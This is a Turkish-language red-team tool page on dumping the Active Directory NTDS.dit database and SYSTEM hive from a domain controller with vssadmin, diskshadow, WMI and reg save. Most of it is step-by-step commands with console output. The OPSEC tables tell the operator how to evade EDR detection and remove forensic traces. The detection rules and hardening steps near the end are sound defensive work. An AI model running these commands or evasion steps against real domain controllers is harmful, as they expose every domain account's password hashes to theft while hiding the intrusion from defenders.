# vssadmin / diskshadow

> **Kategori:** [12. NTDS.dit, GPO Şifreleri ve LAPS Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Volume Shadow Copy Service (VSS) altyapısını kullanarak kilitli durumdaki Active Directory veritabanının (`NTDS.dit`) ve sistem kovanlarının anlık gölge kopyalarını oluşturan ve dışa aktaran yerleşik yönetim araçları.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında etki alanı denetleyicisi (DC) üzerinde çalışan `NTDS.dit` veritabanı, `lsass.exe` ve ESE Jet veritabanı motoru tarafından özel erişimle kilitlenir. Bu kilitleme mekanizması, işletim sistemi çalışırken dosyanın doğrudan kopyalanmasını veya okunmasını engeller. Ancak Windows işletim sistemi, çalışan sunucularda tutarlı yedekleme yapabilmek amacıyla **Volume Shadow Copy Service (VSS)** adlı bir gölge kopya mekanizması barındırır. VSS, diskteki verileri anlık olarak dondurarak (freeze) kilitli dosyaların tutarlı bir kopyasını farklı bir mantıksal birimde salt-okunur (read-only snapshot) olarak sunar.

Kırmızı takım operatörleri ve güvenlik denetçileri için bu yerleşik VSS mimarisi, harici hiçbir saldırı aracı yüklemeden (Living off the Land) etki alanı veritabanını ele geçirme imkanı tanır. Bu süreçte iki temel yerleşik Microsoft ikilisi kullanılır:
1. **vssadmin.exe:** Windows Server ve istemcilerde gölge kopya yönetimini sağlayan standart komut satırı aracıdır. Doğrudan `create shadow /for=C:` komutuyla disk snapshot'ı alır.
2. **diskshadow.exe:** Windows Server ortamlarında bulunan ve betik desteği sunan gelişmiş bir VSS aracıdır. En büyük avantajı, oluşturulan gölge kopyayı doğrudan bir sürücü harfine (örneğin `Z:\`) bağlayabilmesi (`expose`) ve kilitli `NTDS.dit` dosyasının standart `copy` komutuyla alınabilmesini sağlamasıdır.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                        VSS / DISKSHADOW MIMARI AKIŞI                              |
+-----------------------------------------------------------------------------------+
  [Yetkili Denetçi / Admin]                          [Domain Controller (DC)]
   (vssadmin / diskshadow)                               (VSS Framework)
              |                                                 |
              |--- 1. Snapshot Talebi (C: Birimi) ------------->|
              |       [vssadmin create shadow /for=C:]          |--- 2. VSS Servisi
              |                                                 |       (vssvc.exe) Devreye Girer
              |                                                 |
              |<-- 3. Gölge Kopya Aygıt Yolu Döner -------------|--- 3. Snapshot Üretilir
              |       \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX   (Kilit Aşıldı)
              |                                                 |
              |--- 4. ntds.dit Dosyası Gölge Kopyadan Okunur -->|
              |       (copy \\?\GLOBALROOT\...\ntds.dit C:\temp)|
              |                                                 |
              |--- 5. SYSTEM Kovanı Alınır (reg save) --------->|--- 4. SYSKEY Elde Edilir
              |                                                 |
              |--- 6. Snapshot Temizleme Talebi --------------->|--- 5. Gölge Kopya İmha Edilir
              |       [vssadmin delete shadows /shadow=GUID]    |       (Adli İz Azaltılır)
```

### Neden Önemli?

| Yetenek | Operasyonel Avantaj | Alternatif Araçlara Üstünlüğü |
| :--- | :--- | :--- |
| **Tamamen Yerleşik İkililer**| `vssadmin.exe` ve `diskshadow.exe` Microsoft imzalıdır.| Antivirüslerin dosya tarama ve engelleme kurallarını atlatır. |
| **Kilit Engeli Tanımaz** | Dosya kilitlerini işletim sistemi seviyesinde çözer. | Veritabanını durdurmaya (downtime) gerek bırakmaz. |
| **Sürücü Eşleme (Diskshadow)**| Snapshot'ı doğrudan sürücü harfine bağlar (`Z:\`).| Karmaşık aygıt yolları (`GLOBALROOT`) ile uğraşma ihtiyacını kaldırır. |
| **Ağ Replikasyonu Üretmez** | DRSUAPI RPC trafiği üretmez. | Ağ tabanlı IDS/IPS ve DCSync tespitlerini tamamen bertaraf eder. |
| **Betik Desteği (Scripting)**| `diskshadow -s script.txt` ile otomasyona tam uygundur. | Operasyonel müdahaleyi hızlandırır ve insan hatasını önler. |

### Karşılaştırma Tablosu

| Özellik | vssadmin | diskshadow | ntdsutil (IFM) | impacket-secretsdump |
| :--- | :--- | :--- | :--- | :--- |
| **Hedef Platform** | Windows Client & Server | Yalnızca Windows Server | Yalnızca Windows Server | Uzaktan Ağ Üzerinden |
| **Sürücüye Bağlama (Expose)** | Hayır (GLOBALROOT yolu verir)| Evet (`expose` komutu var) | Hayır (Klasöre çıkarır) | Hayır (Bellekten okur) |
| **SYSTEM Kovanını Alma** | Manuel (`reg save` gerekir) | Manuel (`reg save` gerekir) | Otomatik (`registry/` klasörü)| Otomatik (RPC ile çeker) |
| **Ağ Replikasyon İzi** | Sıfır | Sıfır | Sıfır | Yüksek (DRSUAPI Olayları) |
| **Betik Dosyası Desteği** | Yok (Sadece CLI bayrakları) | Var (`-s <dosya.txt>`) | Var (`script <dosya>`) | Parametre tabanlı |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

### vssadmin Sözdizimi

```cmd
vssadmin create shadow /for=<Sürücü_Harfi>: [/quiet]
vssadmin list shadows [/for=<Sürücü_Harfi>:]
vssadmin delete shadows /for=<Sürücü_Harfi>: [/oldest | /all | /shadow=<GUID>] [/quiet]
```

| Parametre | Açıklama | Örnek Değer |
| :--- | :--- | :--- |
| `create shadow` | Belirtilen birim için anlık gölge kopya oluşturur. | `vssadmin create shadow /for=C:` |
| `/for=C:` | Snapshot alınacak kaynak disk bölümünü tanımlar. | `/for=C:` |
| `list shadows` | Sistemdeki mevcut tüm gölge kopyaları ve aygıt yollarını listeler. | `vssadmin list shadows` |
| `delete shadows` | Belirtilen veya tüm gölge kopyaları siler. | `vssadmin delete shadows /all /quiet` |
| `/quiet` | Kullanıcıdan onay istemeden sessiz modda çalışır. | Bayrak (değer almaz) |

### diskshadow Betik Sözdizimi

Diskshadow genellikle komutları içeren bir `.txt` dosyasıyla tetiklenir:

```cmd
diskshadow /s <betik_dosyasi.txt>
```

| Betik Komutu | Açıklama |
| :--- | :--- |
| `set context persistent nowriters` | VSS yazıcılarını beklemeksizin kalıcı bir snapshot bağlamı tanımlar. |
| `add volume C: alias ds_snap` | C: sürücüsünü gölge kopya kümesine ekler ve bir takma ad (`alias`) atar. |
| `create` | Tanımlanan birim için anlık görüntüyü üretir. |
| `expose %ds_snap% Z:` | Üretilen gölge kopyayı doğrudan `Z:` mantıksal sürücü harfine bağlar. |
| `delete shadows volume C:` | Operasyon bittiğinde oluşturulan gölge kopyayı sistemden temizler. |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: vssadmin ile Hızlı Gölge Kopya Alma ve NTDS.dit Çıkarma
DC üzerinde anlık görüntü oluşturup `HarddiskVolumeShadowCopy` aygıt yolundan veritabanını çekme:

```cmd
vssadmin create shadow /for=C:
```

**Konsol Çıktı Analizi:**
```
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:'
    Shadow Copy ID: {4f9a12c8-8812-4c22-b231-182390abcef1}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

Oluşturulan aygıt yolunu kullanarak kilitli veritabanını kopyalama:

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
```

**Konsol Çıktı Analizi:**
```
        1 file(s) copied.
```

### Senaryo 2: diskshadow Betiği ile Snapshot Oluşturma ve Sürücüye Bağlama (Expose)
Doğrudan `Z:` harfine bağlayarak dosya transferini kolaylaştıran diskshadow betiği hazırlama ve koşturma:

```cmd
echo set context persistent nowriters > C:\Windows\Temp\script.txt
echo add volume C: alias ad_snap >> C:\Windows\Temp\script.txt
echo create >> C:\Windows\Temp\script.txt
echo expose %ad_snap% Z: >> C:\Windows\Temp\script.txt
diskshadow /s C:\Windows\Temp\script.txt
```

**Konsol Çıktı Analizi:**
```
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation

* Set context to PERSISTENT NOWRITERS
* Adding volume \\?\Volume{...}\ [C:\] to the shadow set...
* Creating shadow copy...
* Shadow copy created successfully.
* Exposing shadow copy as Z: ...
* The shadow copy was successfully exposed as Z:\
```

Bağlanan `Z:` sürücüsünden `ntds.dit` dosyasını kopyalama:

```cmd
copy Z:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds_from_z.dit
```

### Senaryo 3: SYSTEM Kayıt Defteri Kovanını Alma (SYSKEY Hasadı)
Çıkarılan `ntds.dit` veritabanındaki parola özetlerini çözmek için şart olan `SYSTEM` kovanını diske kaydetme:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_hive /y
```

**Konsol Çıktı Analizi:**
```
The operation completed successfully.
```

### Senaryo 4: PowerShell WMI (Win32_ShadowCopy) ile Dosyasız Snapshot Alma
`vssadmin.exe` komut satırı argümanlarını EDR'dan gizlemek için doğrudan WMI arabirimi üzerinden gölge kopya oluşturma:

```powershell
$class = [wmiclass]"root\cimv2:Win32_ShadowCopy"
$result = $class.Create("C:\", "ClientAccessible")
$shadow = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $result.ShadowID }
Write-Output $shadow.DeviceObject
```

**Konsol Çıktı Analizi:**
```
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

### Senaryo 5: Alınan Gölge Kopyaları Doğrulama ve Listeleme
Mevcut gölge kopyaların listesini ve oluşturulma zaman damgalarını denetleme:

```cmd
vssadmin list shadows /for=C:
```

**Konsol Çıktı Analizi:**
```
Contents of shadow copy set ID: {b428d021-9a71-4821-b389-9a21840291ab}
   Contained 1 shadow copies at creation time: 10/14/2026 8:45:12 PM
      Shadow Copy ID: {4f9a12c8-8812-4c22-b231-182390abcef1}
      Original Volume: (C:)\\?\Volume{7c3a4448-0000-0000-0000-100000000000}\
      Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
      Attributes: Persistent, No writers, Differential
```

### Senaryo 6: Operasyon Sonrası İzleri ve Gölge Kopyayı Temizleme
Denetim tamamlandıktan sonra oluşturulan snapshot'ı sistemden güvenli biçimde silme:

```cmd
vssadmin delete shadows /shadow={4f9a12c8-8812-4c22-b231-182390abcef1} /quiet
```

**Konsol Çıktı Analizi:**
```
Successfully deleted the shadow copy.
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Kök Neden | Kesin Çözüm Adımı |
| :--- | :--- | :--- |
| `Error 0x80042302: A Volume Shadow Copy Service component encountered an unexpected error` | VSS Servisi (`VSS`) devre dışı bırakılmış veya durdurulmuş. | `net start vss` çalıştırın; hizmetin başlangıç türünü `sc config vss start= demand` yapın. |
| `Diskshadow: The drive letter is already in use` | `expose` komutunda seçilen sürücü harfi (`Z:`) sistemde başka bir birim veya ağ paylaşımı tarafından kullanılıyor. | Boşta olan farklı bir harf (`Y:`, `X:`, `K:`) seçin veya `net use` ile mevcut paylaşımları kontrol edin. |
| `Access is denied (0x5)` | Komut istemi yükseltilmiş yönetici (Elevated / Run as Administrator) haklarıyla açılmamış. | Yönetici olarak açılmış komut istemi kullanın; kullanıcının `Backup Operators` veya `Administrators` üyesi olduğunu doğrulayın. |
| `Maximum number of shadow copies reached for this volume` | C: birimi için izin verilen maksimum gölge kopya limiti (varsayılan 64) dolmuş. | Eski kopyaları `vssadmin delete shadows /for=C: /oldest /quiet` ile temizleyin. |
| `VSS_E_SNAPSHOT_SET_IN_PROGRESS (0x80042316)` | Sistemde başka bir yedekleme yazılımı (Veeam, Windows Server Backup) o anda aktif gölge kopya alıyor. | Diğer yedekleme işleminin tamamlanmasını bekleyin veya `vssadmin list writers` ile durumu denetleyin. |
| `The filename, directory name, or volume label syntax is incorrect` | `copy` komutunda `\\?\GLOBALROOT` aygıt yolunun sonunda fazladan veya eksik ters bölü (`\`) işareti var. | Aygıt yolunun sonundaki yazımı birebir `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\...` formatında uygulayın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
[OPSEC GÜRÜLTÜ SKALASI: ORTA]
0 --------------[6.0 - VSS COMMANDS & REG SAVE]-------------- 10
  - Ağ Seviyesi: Sıfır ağ izi (Tamamen yerel çalıştırma)
  - Uç Nokta Seviyesi: vssadmin/diskshadow proses parametreleri ve VSS Event ID'leri (Yüksek tespit potansiyeli)
```

### 5.1 Bırakılan İzler (Event Logs)

* **Windows Security Event ID 4688 / Sysmon Event ID 1 (Process Creation):**
  * `vssadmin.exe create shadow` veya `vssadmin.exe delete shadows` komut satırı kalıpları EDR/SIEM kuralları tarafından anında yakalanır.
  * `diskshadow.exe /s script.txt` veya `-s` argümanı şüpheli aktivite olarak kaydedilir.
* **Security Event ID 4932 / 4933 (Shadow Copy Creation & Deletion):**
  * Windows Güvenlik günlüğüne yeni bir gölge kopya oluşturulduğunda (`4932`) ve silindiğinde (`4933`) olay kaydı düşer.
* **Security Event ID 4672 / 4673 (Privilege Use):**
  * `SeBackupPrivilege` ve `SeRestorePrivilege` ayrıcalıklarının kullanımı denetlenir.
* **System Event Log (Event ID 7036):**
  * Volume Shadow Copy servisinin durum değişiklikleri (Started / Stopped) loglanır.

### 5.2 Ağ ve EDR İmzaları

* **Sıfır Ağ İmzası:**
  Saldırı tamamen etki alanı denetleyicisinin yerel konsolu üzerinde yürütüldüğü için ağ sensörleri (Zeek, Suricata, NDR) herhangi bir anormallik tespit edemez.
* **EDR Davranışsal İmzaları:**
  `reg.exe save HKLM\SYSTEM` komutu ve ardından gölge kopyadan `ntds.dit` dosyasının taşınması, modern EDR ürünlerinin "Credential Access: Local NTDS.dit theft" algoritmalarını tetikler.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
| :--- | :--- | :--- | :--- |
| **Credential Access** | `T1003.003` | OS Credential Dumping: NTDS | VSS snapshot ile kilitli `ntds.dit` dosyasını kopyalama. |
| **Credential Access** | `T1003.002` | OS Credential Dumping: Security Account Manager | `reg save` ile `SYSTEM` kovanını dışa aktarma. |
| **Impact / Evasion** | `T1490` | Inhibit System Recovery | `delete shadows` komutuyla gölge kopyaları silme. |
| **Defense Evasion** | `T1036` | Masquerade / Subverting Controls | Yerleşik Microsoft LOLBin araçlarını kullanma. |

### 5.4 OPSEC Önerileri

| Tespit Riski | Önlem / İyileştirme |
| :--- | :--- |
| **`vssadmin create shadow` Komut Tespiti**| `vssadmin` yerine `diskshadow` betik modu veya doğrudan WMI `Win32_ShadowCopy` API'si tercih edilmelidir. |
| **`vssadmin delete shadows` Alarmı** | Fidye yazılımları (Ransomware) bu komutu yoğun kullandığından bu komuttan kaçınılmalı; snapshot sessizce bırakılmalı veya WMI ile silinmelidir. |
| **`reg save HKLM\SYSTEM` Tespiti** | Kayıt defteri kovanını `reg.exe` yerine doğrudan PowerShell veya bellek içi API'ler üzerinden kaydetmek izi azaltır. |
| **Şüpheli Çıktı Dizini** | Veritabanını `C:\Temp` yerine yedekleme yazılımlarının standart dizinlerine (`C:\ProgramData\Backup\`) kopyalamak gürültüyü azaltır. |

### 5.5 Savunma Karşılığı

#### Sigma Kuralı: vssadmin veya diskshadow ile Şüpheli Gölge Kopya Oluşturma
```yaml
title: VSS ile NTDS veya Kilitli Dosya Hasadi Tespiti
id: b1284a77-4c21-4f90-8819-21a48c901234
status: experimental
description: vssadmin veya diskshadow araclari kullanilarak sistem golge kopyasinin alinmasi ve silinmesi aktivitelerini tespit eder.
references:
    - https://attack.mitre.org/techniques/T1003/003/
author: Active Directory Guvenlik Ekibi
date: 2026/10/14
logsource:
    category: process_creation
    product: windows
detection:
    selection_vssadmin:
        Image|endswith: '\vssadmin.exe'
        CommandLine|contains:
            - 'create'
            - 'shadow'
            - 'delete'
    selection_diskshadow:
        Image|endswith: '\diskshadow.exe'
        CommandLine|contains:
            - '/s'
            - '-s'
    condition: selection_vssadmin or selection_diskshadow
falsepositives:
    - Mesru Windows Server Backup veya ucuncu parti yedekleme yazilimlari.
level: high
tags:
    - attack.credential_access
    - attack.t1003.003
```

#### Microsoft Sentinel KQL Sorgusu
```kql
// DC uzerinde vssadmin/diskshadow komutlarini ve ardindan gerceklesen reg save aktivitelerini korele eder
DeviceProcessEvents
| where TimeGenerated >= ago(24h)
| where FileName in~ ("vssadmin.exe", "diskshadow.exe", "reg.exe")
| where (FileName =~ "vssadmin.exe" and ProcessCommandLine has "create shadow")
     or (FileName =~ "diskshadow.exe" and (ProcessCommandLine has "/s" or ProcessCommandLine has "-s"))
     or (FileName =~ "reg.exe" and ProcessCommandLine has "save" and ProcessCommandLine has "SYSTEM")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated desc
```

#### YARA Kuralı: Diskshadow Hasat Scripti İmzası
```yara
rule Threat_Script_Diskshadow_Harvesting {
    meta:
        description = "Diskshadow VSS NTDS döküm betiklerini tespit eder"
        author = "AD Savunma Laboratuvari"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "set context persistent nowriters" ascii wide nocase
        $s2 = "add volume C:" ascii wide nocase
        $s3 = "expose" ascii wide nocase
        $s4 = "create" ascii wide
    condition:
        all of ($s*)
}
```

#### Sertleştirme (Hardening) Adımları
1. **AppLocker ile diskshadow.exe Kısıtlaması:** Etki alanı denetleyicilerinde `diskshadow.exe` çalıştırılması standart yöneticiler için dahi AppLocker/WDAC politikalarıyla engellenmelidir.
2. **VSS Olay Denetimi (Auditing):** Group Policy üzerinden "Audit File System" ve "Audit Other Object Access Events" etkinleştirilerek Event ID 4932/4933 günlükleri SIEM'e anlık akıtılmalıdır.
3. **Just-In-Time (JIT) DC Erişimi:** DC'lere kalıcı oturum açma yetkisi kaldırılmalı; parola hasadını önlemek amacıyla PIM/PAM çözümleri zorunlu tutulmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. vssadmin ile Hızlı Gölge Kopya Oluşturma
```cmd
vssadmin create shadow /for=C:
```
* **Ne Yapar?:** C: biriminin anlık bir gölge kopyasını alır ve aygıt yolunu ekrana yazdırır.
* **Ne Zaman Kullanılır?:** DC üzerinde kilitli `ntds.dit` dosyasını çekmek için en hızlı yönteme ihtiyaç duyulduğunda.
* **Parametreler:** `create shadow` oluşturma komutu, `/for=C:` kaynak sürücü.

#### 2. Gölge Kopyadan Doğrudan ntds.dit Dosyasını Kopyalama
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
```
* **Ne Yapar?:** Snapshot aygıt yolundan kilitli olmayan veritabanı kopyasını hedef dizine aktarır.
* **Ne Zaman Kullanılır?:** Gölge kopya başarıyla oluşturulduktan hemen sonra.
* **Parametreler:** `copy <kaynak_aygit_yolu> <hedef_yol>`.

#### 3. SYSTEM Kovanını Diske Kaydetme (BootKey Hasadı)
```cmd
reg save HKLM\SYSTEM C:\Temp\SYSTEM /y
```
* **Ne Yapar?:** NTDS parola özetlerini çözmek için gereken BootKey (SYSKEY) bilgisini içeren kovanı kaydeder.
* **Ne Zaman Kullanılır?:** `ntds.dit` veritabanı alındıktan sonra şifre çözme anahtarını tamamlamak için.
* **Parametreler:** `save HKLM\SYSTEM` kovan yolu, `/y` üzerine yazma onayı.

#### 4. diskshadow Betik Dosyası ile Expose Modu
```cmd
diskshadow /s C:\Temp\vss_script.txt
```
* **Ne Yapar?:** Betik dosyasındaki adımları koşturarak gölge kopyayı doğrudan bir sürücü harfine bağlar.
* **Ne Zaman Kullanılır?:** Aygıt yolu karmaşıklığından kaçınmak ve tam otomasyon sağlamak için.
* **Parametreler:** `/s` betik dosyası parametresi.

#### 5. Mevcut Tüm Gölge Kopyaları Listeleme
```cmd
vssadmin list shadows
```
* **Ne Yapar?:** Sistemde kayıtlı tüm gölge kopyaları, ID'lerini ve aygıt yollarını listeler.
* **Ne Zaman Kullanılır?:** Önceden alınmış bir snapshot varlığını ve aygıt numarasını doğrulamak için.
* **Parametreler:** Parametresiz listeleyici komut.

#### 6. Tekil Bir Gölge Kopyayı Silme
```cmd
vssadmin delete shadows /shadow={GUID-DEGERI} /quiet
```
* **Ne Yapar?:** Belirtilen kimliğe sahip gölge kopyayı kullanıcı onayı istemeden siler.
* **Ne Zaman Kullanılır?:** Hasat operasyonu bittiğinde sistemde adli iz bırakmamak için.
* **Parametreler:** `/shadow={GUID}` silinecek ID, `/quiet` sessiz mod.

#### 7. Tüm Gölge Kopyaları Topluca Temizleme
```cmd
vssadmin delete shadows /all /quiet
```
* **Ne Yapar?:** Sistemdeki tüm mevcut snapshot'ları tek hamlede yok eder.
* **Ne Zaman Kullanılır?:** Çok sayıda gölge kopyanın biriktiği durumlarda tam temizlik için.
* **Parametreler:** `/all` tüm kopyalar.

#### 8. WMI Win32_ShadowCopy ile Dosyasız Snapshot
```powershell
(Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
```
* **Ne Yapar?:** `vssadmin.exe` sürecini başlatmadan doğrudan WMI API çağrısıyla gölge kopya üretir.
* **Ne Zaman Kullanılır?:** EDR proses izleme kurallarını atlatmak için.
* **Parametreler:** PowerShell WMI statik metot çağrısı.

#### 9. Sürücüye Bağlı Gölge Kopyayı Sistemden Ayırma (Unexpose)
```cmd
diskshadow /c "unexpose Z:"
```
* **Ne Yapar?:** Önceden `Z:` sürücüsüne bağlanmış olan gölge kopya harfini serbest bırakır.
* **Ne Zaman Kullanılır?:** `diskshadow` kopyalama işlemi bittiğinde sürücüyü temizlemek için.
* **Parametreler:** `/c` tekil komut çalıştırma bayrağı.

#### 10. Elde Edilen ntds.dit Dosyasının Boyutunu Kontrol Etme
```cmd
dir /s C:\Temp\ntds.dit
```
* **Ne Yapar?:** Alınan veritabanı dosyasının eksiksiz kopyalandığını ve 0-byte olmadığını doğrular.
* **Ne Zaman Kullanılır?:** Dosyaları çevrimdışı analiz makinesine aktarmadan önce.
* **Parametreler:** `dir` komut çıktısı.

---

## Kaynaklar
* [Microsoft Dokümantasyonu: vssadmin Komut Başvurusu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin)
* [Microsoft Dokümantasyonu: diskshadow Komut Başvurusu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)
* [MITRE ATT&CK: OS Credential Dumping: NTDS (T1003.003)](https://attack.mitre.org/techniques/T1003/003/)
* [MITRE ATT&CK: Inhibit System Recovery (T1490)](https://attack.mitre.org/techniques/T1490/)
* [HackTricks: Bypassing NTDS.dit Lock via Volume Shadow Copies](https://book.hacktricks.xyz/windows-hardening/stealing-credentials#vssadmin)

---

> **Önceki:** [← ntdsutil](./ntdsutil.md) · **Sonraki:** [Invoke-NinjaCopy →](./Invoke-NinjaCopy.md)
